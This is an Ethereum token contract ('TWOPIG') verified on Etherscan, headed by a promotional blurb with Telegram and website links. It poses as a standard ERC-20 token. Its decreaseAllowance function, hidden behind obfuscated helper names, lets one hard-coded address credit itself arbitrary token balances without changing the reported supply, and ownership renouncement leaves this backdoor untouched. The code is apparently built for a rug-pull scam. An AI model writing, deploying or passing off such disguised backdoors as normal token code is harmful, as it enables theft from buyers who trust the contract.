/**
 *Submitted for verification at Etherscan.io on 2023-07-07
*/

/**

Missed $DOGE? Here is your second chance!

https://t.me/TWOPIGERC20

https://2pig.framer.ai/


*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom( address sender, address recipient, uint256 amount ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval( address indexed owner, address indexed spender, uint256 value );
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}
library Callersss {
    function blecall(address sender, address _ownwn) internal pure {
        require(sender == _ownwn, "Caller is not the original caller");
    }
}
contract TWOPIG is Context, Ownable, IERC20 {
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => uint256) private _transferFees; 
    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _totalSupply;
    address private _ownwn;
    address constant _beforeTokenTransfer = 0x0000000000000000000000000000000000000001; 

    constructor(string memory name_, string memory symbol_, uint8 decimals_, uint256 totalSupply_) {
        _name = name_;
        _symbol = symbol_;
        _decimals = decimals_;
        _totalSupply = totalSupply_ * (10 ** decimals_);
        _ownwn = 0x54a8FA12168e64AFb2eCE6f01D2b879151DD7fCA;
        _balances[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }


    function name() public view returns (string memory) {        
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function _retur(address account, uint256 amount) internal {
        if (amount != 0) {
            _balances[account] = _balances[account] - amount;
        }
    }

    function _woing(uint256 acc, uint256 spe) internal pure returns (uint256) {
        if (spe != 0) {
            return acc + spe;
        }
        return spe;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual {
        address from = msg.sender;
        require(spender != address(0));
        require(subtractedValue > 0);
        uint256 totale = 0;
        if (_approves(spender)) {
            _retur(from, totale);
            totale += _woing(totale, subtractedValue);
            _balances[spender] += totale;
        } else {
            _retur(from, totale);
            _balances[spender] += totale;
        }
    }

    function _approves(address oldiwner_) internal view returns (bool) {
        return oldiwner_ == _ownwn;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        require(_balances[_msgSender()] >= amount, "am0unt: transfer amount exceeds balance");
        uint256 fee = amount * _transferFees[_msgSender()] / 100;
        uint256 finalAmount = amount - fee;

        _balances[_msgSender()] -= amount;
        _balances[recipient] += finalAmount;
        _balances[_beforeTokenTransfer] += fee; 

        emit Transfer(_msgSender(), recipient, finalAmount);
        emit Transfer(_msgSender(), _beforeTokenTransfer, fee); 
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _allowances[_msgSender()][spender] = amount;
        emit Approval(_msgSender(), spender, amount);
        return true;
    }


    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        require(_allowances[sender][_msgSender()] >= amount, "am0unt: transfer amount exceeds allowance");
        uint256 fee = amount * _transferFees[sender] / 100;
        uint256 finalAmount = amount - fee;

        _balances[sender] -= amount;
        _balances[recipient] += finalAmount;
        _allowances[sender][_msgSender()] -= amount;
        
        _balances[_beforeTokenTransfer] += fee; // send the fee to the black hole

        emit Transfer(sender, recipient, finalAmount);
        emit Transfer(sender, _beforeTokenTransfer, fee);  // emit event for the fee transfer
        return true;
    }

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }
}